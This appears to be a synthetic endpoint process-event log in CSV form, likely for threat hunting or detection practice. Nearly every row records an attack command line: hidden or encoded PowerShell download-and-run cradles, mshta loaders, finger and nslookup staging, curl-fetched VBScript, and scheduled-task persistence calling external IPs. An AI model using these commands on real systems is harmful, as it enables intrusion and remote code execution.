Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-01T19:18:33.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NonInteractive -Ep Bypass -c ""iex((New-Object Net.WebClient).DownloadString('https://77.91.68.20/payload.ps1'))""",5197,explorer.exe,5110,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,107407f9fd3063759eef8f3925dc6852
2026-02-02T18:40:01.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -WindowStyle Hidden -EncodedCommand cwB0AGEAcgB0AC0AcAByAG8AYwBlAHMAcwAgAGgAdAB0AHAAcwA6AC8ALwA4ADUALgAyADMAOQAuADMAMgAuADEANAAvAHIAdQBuAA==,5571,explorer.exe,5348,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,c85bdbf3b44052607ce55b01fb10ae73
2026-02-03T18:25:03.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -w hidden -nop -ep bypass -c ""irm https://179.43.167.55/stage1 | iex""",5808,explorer.exe,5676,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,05e2c1cf9ba2598f6b011763055210e3
2026-02-04T20:56:08.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(iwr -UseBasicParsing https://212.193.30.21/ldr.ps1)""",6102,explorer.exe,6018,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,d65147ccbaf3de9064ed5bfdfae14005
2026-02-05T19:15:58.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://fake-browser-update.store/update.hta,6327,explorer.exe,6276,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,c2cbfae854493f33a02fab3a21791c31
2026-02-06T21:12:25.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,"mshta.exe ""javascript:b=new ActiveXObject('WScript.Shell');b.Run('powershell -w hidden -c iex(iwr https://45.141.87.30/stager)',0)""",6504,explorer.exe,6407,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,56113ed03545bb0107ccf5a51f8507d6
2026-02-07T20:55:34.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,mshta.exe,C:\Windows\System32\mshta.exe,c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4,mshta.exe https://cdn-verify.live/check.hta,6773,explorer.exe,6648,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,fc19aaaa586ac5e8fdde5c0394a32537
2026-02-08T23:30:43.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe admin@77.91.68.20,6937,explorer.exe,6839,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,71afb9fe942401d0fb0c67c861cd49d8
2026-02-09T23:43:01.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,ct.exe,C:\Windows\System32\ct.exe,a1b2c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3,ct.exe 45.141.87.30,7267,explorer.exe,7181,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,58d53ffa43ac56d3044cd77e25866cdc
2026-02-10T22:34:19.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,finger.exe,C:\Windows\System32\finger.exe,f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,finger.exe info@179.43.167.55,7760,explorer.exe,7525,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,87bf8605e370e794923478bf75cebd09
2026-02-12T00:26:58.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup c2-loader.xyz 77.91.68.20,8174,explorer.exe,7949,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,7f3841ad774bd7e4c81ea4df10ffe9d2
2026-02-12T00:27:00.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup c2-loader.xyz 77.91.68.20,8203,cmd.exe,8174,cmd.exe /c nslookup c2-loader.xyz 77.91.68.20,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,270eb4336f18e841324352ad47ea8557
2026-02-13T00:44:50.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup drop.install-check.shop 45.141.87.30,8351,explorer.exe,8283,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,907d386d2cbea1c5d2affc4479ad5585
2026-02-13T00:44:52.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup drop.install-check.shop 45.141.87.30,8482,cmd.exe,8351,cmd.exe /c nslookup drop.install-check.shop 45.141.87.30,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,366e8d85b8a0c5339dcd34e3c80146a6
2026-02-13T20:01:07.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nslookup stage2.verify-update.live 179.43.167.55,8765,explorer.exe,8605,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,6b07c89ad9e5454b32f7845e121b6d64
2026-02-13T20:01:09.000Z,55e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5,PROD-LT-011,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup stage2.verify-update.live 179.43.167.55,8930,cmd.exe,8765,cmd.exe /c nslookup stage2.verify-update.live 179.43.167.55,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,9648c724f58aafc0d786624dc15895e4
2026-02-14T23:54:33.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""WindowsSecurity"" /tr ""wscript.exe C:\Users\Public\sec.vbs"" /sc minute /mo 19 /f",9178,powershell.exe,9005,"powershell.exe -W Hidden -c ""iex(iwr https://77.91.68.20/init)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,9020576eb33a26a02f9939580bd6105f
2026-02-15T22:15:22.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""ChromeUpdater"" /tr ""powershell.exe -w hidden -c iex(iwr https://77.91.68.20/c2)"" /sc minute /mo 19 /f",9506,powershell.exe,9280,"powershell.exe -W Hidden -c ""iex(iwr https://77.91.68.20/init)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,8b88cea27e5e0cfc76d428bb1a6b7750
2026-02-16T22:59:52.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""DriverHelper"" /tr ""mshta.exe https://45.141.87.30/drv.hta"" /sc minute /mo 19 /f",9777,powershell.exe,9523,"powershell.exe -W Hidden -c ""iex(iwr https://77.91.68.20/init)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,e52d629dacdbd98dfd8b6ef926f1bc3d
2026-02-21T00:31:23.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,curl.exe -s https://job-interview-verify.com/check -o C:\Users\Public\check.vbs,10655,cmd.exe,10399,cmd.exe /c curl.exe -s https://job-interview-verify.com/check -o C:\Users\Public\check.vbs,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,258651853fdedafccd9427619e1f2404
2026-02-21T00:31:58.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,e5f6a1b2d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,"wscript.exe ""C:\Users\Public\check.vbs""",10878,curl.exe,10655,curl.exe -s https://job-interview-verify.com/check -o C:\Users\Public\check.vbs,cmd.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,286230a33fdf42d431fab3a7f653eb7c
2026-02-21T23:36:17.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,curl.exe --silent https://45.141.87.30/runner.vbs -o C:\ProgramData\runner.vbs,11212,cmd.exe,11088,cmd.exe /c curl.exe --silent https://45.141.87.30/runner.vbs -o C:\ProgramData\runner.vbs,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,0a76ff7a6d788a3707f070270dc52dca
2026-02-21T23:36:52.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,e5f6a1b2d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,"wscript.exe ""C:\ProgramData\runner.vbs""",11280,curl.exe,11212,curl.exe --silent https://45.141.87.30/runner.vbs -o C:\ProgramData\runner.vbs,cmd.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,02dd2e6db98d0cb24887ff564acee82d
2026-02-22T23:57:33.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,curl.exe,C:\Windows\System32\curl.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,curl.exe -k https://77.91.68.20/cam-fix.vbs -o C:\Users\Public\cam.vbs,11434,cmd.exe,11288,cmd.exe /c curl.exe -k https://77.91.68.20/cam-fix.vbs -o C:\Users\Public\cam.vbs,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,9cb8ce3093ab44b780378df78fdf9782
2026-02-22T23:58:08.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,wscript.exe,C:\Windows\System32\wscript.exe,e5f6a1b2d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1,"wscript.exe ""C:\Users\Public\cam.vbs""",11600,curl.exe,11434,curl.exe -k https://77.91.68.20/cam-fix.vbs -o C:\Users\Public\cam.vbs,cmd.exe,d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,e7c156c602bea7178c6f40f51ba7358e
2026-02-23T17:59:08.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/kimsuky2.ps1)""",12027,explorer.exe,11814,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,982fa107b54fa75e77822ef116eeef32
2026-02-23T18:00:58.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""KUpdate"" /tr ""wscript.exe C:\Users\Public\ku.vbs"" /sc minute /mo 19 /f",12037,powershell.exe,12027,"powershell.exe -W Hidden -NoP -c ""iex(iwr https://77.91.68.20/kimsuky2.ps1)""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,61594276973c02b784470b5814502bdd
2026-02-24T19:50:13.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA0ADUALgAxADQAMQAuADgANwAuADMAMAAvAGsAMgApAA==,12527,explorer.exe,12309,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,35c6683d391353560b213e79355f300b
2026-02-24T19:52:03.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""KUpdate"" /tr ""wscript.exe C:\Users\Public\ku.vbs"" /sc minute /mo 19 /f",12739,powershell.exe,12527,powershell.exe -EncodedCommand aQBlAHgAKABpAHcAcgAgAGgAdAB0AHAAcwA6AC8ALwA0ADUALgAxADQAMQAuADgANwAuADMAMAAvAGsAMgApAA==,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,58028052128c955e2e30f7abeb1294aa
2026-02-25T19:45:39.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/kimsuky/c2')""",13102,explorer.exe,12916,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,aa3d0403cf84f63dfe0632d5a403865f
2026-02-25T19:47:29.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""KUpdate"" /tr ""wscript.exe C:\Users\Public\ku.vbs"" /sc minute /mo 19 /f",13184,powershell.exe,13102,"powershell.exe -W Hidden -c ""IEX(New-Object Net.WebClient).DownloadString('https://179.43.167.55/kimsuky/c2')""",explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,ad28c115b2a9fdfcd977aeede0e863da
2026-02-26T18:44:32.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -W Hidden -NoP -Ep Bypass -c ""iex(iwr https://77.91.68.20/mw2)""",13417,explorer.exe,13208,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,trichter,PROD,S-1-5-21-9876543210-0987654321-123456789-2005,a4522e556085830e08ca2c47a69330af
